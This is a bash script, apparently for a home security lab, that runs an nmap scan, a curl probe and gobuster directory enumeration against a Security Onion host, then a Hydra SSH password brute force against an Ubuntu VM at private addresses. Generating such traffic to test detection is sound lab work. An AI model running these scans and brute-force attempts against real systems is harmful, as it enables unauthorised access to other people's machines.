#!/usr/bin/env bash
set -euo pipefail

SO_IP="192.168.20.10"
UBUNTU_IP="192.168.117.128"

echo "[*] Nmap recon against Security Onion..."
sudo nmap -sS -p 22,80,443,9200 "$SO_IP" || true

echo "[*] curl TLS probe..."
curl -k -I "https://$SO_IP" || true

echo "[*] Gobuster web enum..."
gobuster dir -u "https://$SO_IP" -k -w /usr/share/wordlists/dirb/common.txt -t 10 || true

echo "[*] Hydra SSH brute force against Ubuntu (Host-Only)..."
echo "[!] Ensure Ubuntu SSH is enabled and you have a small password list for demo."
# Example expects /tmp/pw.txt exists:
# echo -e "Password123\npassword\n123456" > /tmp/pw.txt
hydra -l testuser -P /tmp/pw.txt "ssh://$UBUNTU_IP" -t 4 || true

echo "[*] Done."
